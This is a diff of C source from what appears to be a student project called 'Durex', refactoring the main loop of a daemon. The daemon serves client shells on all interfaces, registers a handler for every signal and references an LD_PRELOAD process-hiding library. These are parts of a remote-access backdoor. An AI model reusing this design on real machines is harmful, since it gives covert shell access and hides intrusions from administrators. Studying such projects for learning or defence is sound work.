@@ -6,13 +6,13 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2019/08/04 06:05:02 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/08/04 20:50:47 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 /* signal */
 #include <signal.h>
-/* remove, snprintf */
+/* snprintf */
 #include <stdio.h>
 /* exit */
 #include <stdlib.h>
@@ -27,7 +27,7 @@
 #include "main.h"
 #include "durex.h"
 
-static void			clearStructure()
+static void		clearStructure()
 {
 	e.lock = -1;
 	e.server.reporter = -1;
@@ -41,11 +41,11 @@ static void			clearStructure()
 	}
 }
 
-static int			launch_program()
+static int		launch_program()
 {
-	char			proc[256];
-	char			buf[20];
-	int				ret;
+	char		proc[256];
+	char		buf[20];
+	int			ret;
 
 	unlink(DUREX_PRELOAD);
 	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_RDWR, 0600);
@@ -81,10 +81,10 @@ static int			launch_program()
 	return 1;
 }
 
-static int			setupSelect()
+static int		setupSelect()
 {
-	int				i;
-	int				max;
+	int			i;
+	int			max;
 
 	FD_ZERO(&e.server.fdr);
 	FD_ZERO(&e.server.fdw);
@@ -109,55 +109,53 @@ static int			setupSelect()
 	return max;
 }
 
-void				durex()
+static int		durex_loop(struct timeval *timeout)
 {
 	int				maxfd;
 	int				ret;
+
+	maxfd = setupSelect();
+	ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, timeout);
+	if (ret == -1 && errno != EINTR) {
+		serverLog(1, "[ERRO] - %s\n", strerror(errno));
+		return (0);
+	}
+	if (FD_ISSET(e.server.fd, &e.server.fdr))
+		serverAcceptConnections();
+	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
+	{
+		if (e.server.client[i].fd == -1)
+			continue ;
+		if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
+			serverReadClient(&e.server.client[i]);
+		if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
+			serverWriteClient(&e.server.client[i]);
+		if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
+			serverReadClientShell(&e.server.client[i]);
+	}
+	return (1);
+}
+
+void			durex()
+{
+	int				sig;
 	struct timeval	timeout;
 
 	clearStructure();
-	if (launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT))
+	if (launch_program() && hireReporter() && create_library()
+		&& openServer("0.0.0.0", SERVER_PORT))
 	{
 		e.server.uptime = time(NULL);
 		serverLog(2, "[LOGS] - Server online\n");
 		mymemset(&timeout, 0, sizeof(timeout));
-		ret = 0;
-		while (ret < _NSIG)
-			signal(ret++, &durexSigHandler);
-		while (1)
-		{
-			maxfd = setupSelect();
-			ret = select(maxfd + 1, &e.server.fdr, &e.server.fdw, NULL, &timeout);
-			if (ret == -1 && errno != EINTR) {
-				serverLog(1, "[ERRO] - %s\n", strerror(errno));
-				break ;
-			}
-			if (FD_ISSET(e.server.fd, &e.server.fdr))
-				serverAcceptConnections();
-			for (int i = 0; i < SERVER_CLIENT_MAX; i++)
-			{
-				if (e.server.client[i].fd == -1)
-					continue ;
-				if (FD_ISSET(e.server.client[i].fd, &e.server.fdr))
-					serverReadClient(&e.server.client[i]);
-				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
-					serverWriteClient(&e.server.client[i]);
-				if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
-					serverReadClientShell(&e.server.client[i]);
-			}
-		}
+		sig = 0;
+		while (sig < _NSIG)
+			signal(sig++, &durexSigHandler);
+		while (sig)
+			sig = durex_loop(&timeout);
 		serverLog(1, "[FATAL] - Weird... \n");
 		quitClearlyServer();
 		quitClearlyDaemon();
 	}
 	write(STDOUT_FILENO, DUREX_USERS, sizeof(DUREX_USERS));
-}
-
-void			quitClearlyDaemon()
-{
-	flock(e.lock, LOCK_UN);
-	close(e.lock);
-	remove(DUREX_LOCK_FILE);
-	remove(DUREX_PRELOAD);
-	remove(DUREX_PROCESSHIDER_LIB);
 }
